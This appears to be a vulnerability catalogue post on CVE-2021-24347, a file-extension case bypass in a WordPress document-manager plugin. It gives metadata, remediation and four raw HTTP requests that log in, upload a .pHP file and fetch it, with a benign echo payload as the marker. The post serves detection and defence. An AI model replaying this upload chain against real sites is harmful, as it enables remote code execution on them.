---
layout: post
cve_id: CVE-2021-24347
title: WordPress SP Project & Document Manager <4.22 - Authenticated Shell Upload
pcap: true
pcap_path: /pcaps/2021/CVE-2021-24347.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-24347.yaml
snort2_rule: N/A
snort3_rule: N/A
author: theamanrawat
severity: high
impact: 'Successful exploitation of this vulnerability can result in unauthorized
  remote code execution on the affected WordPress site.

  '
remediation: Fixed in version 4.22.
reference:
- https://wpscan.com/vulnerability/8f6e82d5-c0e9-468e-acb8-7cd549f6a45a
- https://wordpress.org/plugins/sp-client-document-manager/
- https://nvd.nist.gov/vuln/detail/CVE-2021-24347
- http://packetstormsecurity.com/files/163434/WordPress-SP-Project-And-Document-Manager-4.21-Shell-Upload.html
- https://github.com/Hacker5preme/Exploits
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2021-24347
  cwe-id: CWE-178
  epss-score: 0.81417
  epss-percentile: 0.99138
  cpe: cpe:2.3:a:smartypantsplugins:sp_project_\&_document_manager:*:*:*:*:*:wordpress:*:*
metadata:
  verified: true
  max-request: 4
  vendor: smartypantsplugins
  product: sp_project_\&_document_manager
  framework: wordpress
tags:
- cve2021
- cve
- sp-client-document-manager
- wpscan
- wp-plugin
- wp
- authenticated
- wordpress
- rce
- packetstorm
- intrusive
- smartypantsplugins
- vuln
---

## ðŸ” Vulnerability Description
WordPress SP Project & Document Manager plugin before 4.22 is susceptible to authenticated shell upload. The plugin allows users to upload files; however, the plugin attempts to prevent PHP and other similar executable files from being uploaded via checking the file extension. PHP files can still be uploaded by changing the file extension's case, for example, from php to pHP.


## ðŸŒ HTTP Request
```nohighlight
POST /wp-login.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Length: 38
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
log=0cyneE&pwd=xBxkbW&wp-submit=Log+In
```

```nohighlight
GET /wp-admin/admin.php?page=sp-client-document-manager-fileview HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /wp-admin/admin.php?page=sp-client-document-manager-fileview&id=1 HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.17
Connection: close
Content-Length: 1028
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Accept-Encoding: gzip
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Content-Disposition: form-data; name="cdm_upload_file_field"
tLi2LQ
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Content-Disposition: form-data; name="_wp_http_referer"
/wordpress/wp-admin/admin.php?page=sp-client-document-manager-fileview&id=1
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Content-Disposition: form-data; name="dlg-upload-name"
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Content-Disposition: form-data; name="dlg-upload-file[]"; filename=""
Content-Type: application/octet-stream
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Content-Disposition: form-data; name="dlg-upload-file[]"; filename="38FGpfnaWsk8y1Bbb2Z4JJ7f9CJ.pHP"
Content-Type: image/svg+xml
<?php
echo "CVE-2021-24347";
?>
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Content-Disposition: form-data; name="dlg-upload-notes"
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy
Content-Disposition: form-data; name="sp-cdm-community-upload"
Upload
------WebKitFormBoundaryaeBrxrKJzAF0Tgfy--
```

```nohighlight
GET /wp-content/uploads/sp-client-document-manager/1/38fgpfnawsk8y1bbb2z4jj7f9cj.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

